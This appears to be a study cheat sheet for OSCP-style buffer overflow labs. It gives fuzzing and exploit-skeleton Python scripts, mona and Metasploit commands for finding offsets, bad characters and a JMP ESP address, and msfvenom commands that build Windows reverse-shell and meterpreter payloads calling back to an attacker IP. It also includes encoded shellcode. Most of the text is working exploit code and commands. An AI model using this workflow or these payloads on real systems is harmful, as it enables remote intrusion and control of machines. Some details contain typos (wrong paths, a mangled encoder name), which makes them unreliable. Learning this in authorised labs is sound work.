# BufferOverflow

Encoding needs to be "latin-1"
End send command with "\r\n"

## Registers

### EIP

**Extended Instruction Pointer**
Register for the next command, e.g. jump back address. If you can overwrite the EIP you can control where to jump next

### ESP
**Extended Stack Pointer**
Register contains the value of the last address which was pushed to the stack. ESP ist the top point of the stack. There we can address our shellcode.

### EBP
**Extended Base Stack Pointer**
Register contains the first address of a stack. This one is dynamic and had to be definded. 

## nasm

Get opcode: 

```console
$ locate nasm_shell.rb

$ /usr/shares/metasploit-framework/tools/exploit/nasm_shell.rb
>>> jmp esp
00000000  FFE4		jmp esp
```

## Mona

```console
Set up working directory:
!mona config -set workingfolder c:\mona\%p

Find offset:
!mona findmsp -distance 600
- distance lenght of payload

Create bytearray:
!mona bytearray -b "\x00"
-b "bad chars"

Compare bytearray with bytes in stack
!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>

Find jump esp
!mona jmp -r esp -cpb "<all bad chars>"

!mona jmp -r esp -m <name of exe>
```

## Fuzzing

Make note of the largest number of bytes

```python
#!/usr/bin/env python3
import socket, time, sys

ip = "MACHINE_IP"
port = 1337
timeout = 5
prefix = "OVERFLOW1 "
string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

## Crash Replication and Controlling EIP

```python
#!/usr/bin/env python3
import socket

ip = "MACHINE_IP"
port = 1337
prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Create a cyclic pattern 400 bytes longer than the crash bytes 

```console
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600

```

Copy that string to **payload**
Run the python script and crash binary again.
Check the EIP offset:

	- with mona `!mona findmsp -distance 600`
	or
	- with metasploit `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP adress>`

Set the offset in python script and change payload to "" and change `retn` to `BBBB`
Crash the server again, the EIP register should now show 4 B's -> `42424242`

## Finding bad chars

Generate a bytearray using mona (excluding \x00): `!mona bytearray -b "\x00"`

Now generate a string which is identical to the bytearray with python (excluding \x00)

```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Update exploit script **payload** with string generated from the above python script.
Crash binary again and check with mona for bad chars: `!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>`

Check one after one. 
Generate a new byte array with mona e.g. `!mona bytearray -b "\x00\xa2` and remove "\xa2" from payload.
Crash binary again and compare the bytearray with esp address till message `Unmodified` appears.

## Finding jmp point

Run mona `!mona jmp -r esp -cpb "<all bad chars>"`
Choose an address and update exploit.py with the address at var `retn`
Address must be backwards! (little endian)
e.g. \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit

## Generate payload

```console
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.66.62 LPORT=9001 EXITFUNC=thread -b "\x00" -f c

With encoding
$ msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "<all bad chars>" -f c x86/shikata_ga_nai

$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.66.62 LPORT=4444 EXITFUNC=thread -b "\x00" -f c x86/shikata_ga_nai6
```

Copy generated C string without semicolon to exploit.py under payload

```
payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
...
"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
```

## Prepend NOPs

Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:

`padding = "\x90" * 16`

## Exploit

Run crash again to get a reverse shell

Opt:
Set breakpoint to jmp point address and go steps further to watch NOPs and decoding the payload.